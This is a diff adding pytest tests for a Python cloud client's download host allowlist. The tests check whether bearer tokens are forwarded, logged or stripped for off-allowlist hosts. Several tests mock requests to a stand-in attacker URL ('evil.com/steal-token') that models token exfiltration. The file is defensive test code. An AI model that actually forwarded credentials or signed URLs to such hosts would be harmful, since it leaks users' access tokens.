@@ -4,6 +4,7 @@ from __future__ import annotations
 import httpx
 import pytest
 import respx
+import structlog
 
 from backend.clients.ndi_cloud import NdiCloudClient
 from backend.errors import (
@@ -173,5 +174,158 @@ async def test_ndiquery_invalid_negation_maps_typed() -> None:
                     searchstructure=[{"operation": "~or", "param1": [], "param2": []}],
                     scope="public",
                 )
+        finally:
+            await client.close()
+
+
+# ---------------------------------------------------------------------------
+# download_file host allowlist (PR-6)
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_download_from_allowlisted_host_sends_bearer() -> None:
+    """Phase-agnostic: if the host is on the allowlist, Authorization is sent."""
+    captured: dict[str, str] = {}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        captured["authorization"] = request.headers.get("Authorization", "")
+        return httpx.Response(200, content=b"FILE_BYTES")
+
+    with respx.mock(assert_all_called=False) as router:
+        router.get("https://mybucket.s3.amazonaws.com/path/file.nbf").mock(
+            side_effect=handler,
+        )
+        client = NdiCloudClient()
+        await client.start()
+        try:
+            body = await client.download_file(
+                "https://mybucket.s3.amazonaws.com/path/file.nbf",
+                access_token="jwt-abc",
+            )
+            assert body == b"FILE_BYTES"
+            assert captured["authorization"] == "Bearer jwt-abc"
+        finally:
+            await client.close()
+
+
+def _settings_with_enforce(enforce: bool):
+    """Build a fresh Settings instance with the enforce flag set.
+
+    Doesn't touch the cached module-level singleton — we pass the settings to
+    NdiCloudClient explicitly. conftest.py sets the required env vars so
+    `Settings()` picks them up from the environment.
+    """
+    from backend.config import Settings
+
+    return Settings(DOWNLOAD_ALLOWLIST_ENFORCE=enforce)  # type: ignore[call-arg]
+
+
+@pytest.mark.asyncio
+async def test_download_from_off_allowlist_host_logs_warning_phase1() -> None:
+    """Phase 1 (enforce=False): Authorization still forwarded, warning logged."""
+    captured: dict[str, str] = {}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        captured["authorization"] = request.headers.get("Authorization", "")
+        return httpx.Response(200, content=b"EVIL")
+
+    with respx.mock(assert_all_called=False) as router:
+        router.get("https://evil.com/steal-token").mock(side_effect=handler)
+        client = NdiCloudClient(settings=_settings_with_enforce(False))
+        await client.start()
+        try:
+            with structlog.testing.capture_logs() as logs:
+                body = await client.download_file(
+                    "https://evil.com/steal-token?X-Amz-Signature=SECRET",
+                    access_token="jwt-abc",
+                )
+            assert body == b"EVIL"
+            # Phase-1: Authorization header STILL forwarded (we observe only).
+            assert captured["authorization"] == "Bearer jwt-abc"
+            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
+            assert events, f"expected off_allowlist_host warning, got {logs}"
+            assert events[0]["host"] == "evil.com"
+            assert events[0]["enforce"] is False
+            # url_pattern in log must NOT leak the signed-URL query.
+            assert "X-Amz-Signature" not in events[0]["url_pattern"]
+        finally:
+            await client.close()
+
+
+@pytest.mark.asyncio
+async def test_download_from_off_allowlist_host_strips_auth_phase2() -> None:
+    """Phase 2 (enforce=True): Authorization stripped; warning still logged."""
+    captured: dict[str, str | None] = {}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        captured["authorization"] = request.headers.get("Authorization")
+        return httpx.Response(200, content=b"NOT_SENT")
+
+    with respx.mock(assert_all_called=False) as router:
+        router.get("https://evil.com/steal-token").mock(side_effect=handler)
+        client = NdiCloudClient(settings=_settings_with_enforce(True))
+        await client.start()
+        try:
+            with structlog.testing.capture_logs() as logs:
+                body = await client.download_file(
+                    "https://evil.com/steal-token",
+                    access_token="jwt-abc",
+                )
+            assert body == b"NOT_SENT"
+            # Phase-2: Authorization header MUST be absent.
+            assert captured["authorization"] is None
+            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
+            assert events, f"expected off_allowlist_host warning, got {logs}"
+            assert events[0]["enforce"] is True
+        finally:
+            await client.close()
+
+
+@pytest.mark.asyncio
+async def test_download_without_token_on_off_allowlist_host_sends_no_auth() -> None:
+    """No token passed + non-allowlisted host: request goes out with no auth,
+    regardless of enforce flag (nothing to strip)."""
+    captured: dict[str, str | None] = {}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        captured["authorization"] = request.headers.get("Authorization")
+        return httpx.Response(200, content=b"OK")
+
+    with respx.mock(assert_all_called=False) as router:
+        router.get("https://evil.com/file").mock(side_effect=handler)
+        client = NdiCloudClient(settings=_settings_with_enforce(True))
+        await client.start()
+        try:
+            body = await client.download_file("https://evil.com/file")
+            assert body == b"OK"
+            assert captured["authorization"] is None
+        finally:
+            await client.close()
+
+
+@pytest.mark.asyncio
+async def test_download_from_cloud_host_always_allowlisted() -> None:
+    """Cloud host (from NDI_CLOUD_URL) is added to the runtime allowlist
+    dynamically — Bearer is forwarded without a warning."""
+    captured: dict[str, str] = {}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        captured["authorization"] = request.headers.get("Authorization", "")
+        return httpx.Response(200, content=b"INTERNAL")
+
+    with respx.mock(assert_all_called=False) as router:
+        router.get("https://api.example.test/internal/file").mock(side_effect=handler)
+        client = NdiCloudClient(settings=_settings_with_enforce(True))
+        await client.start()
+        try:
+            with structlog.testing.capture_logs() as logs:
+                body = await client.download_file(
+                    "https://api.example.test/internal/file",
+                    access_token="jwt-abc",
+                )
+            assert body == b"INTERNAL"
+            assert captured["authorization"] == "Bearer jwt-abc"
+            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
+            assert not events, "cloud host should not log the off-allowlist warning"
         finally:
             await client.close()
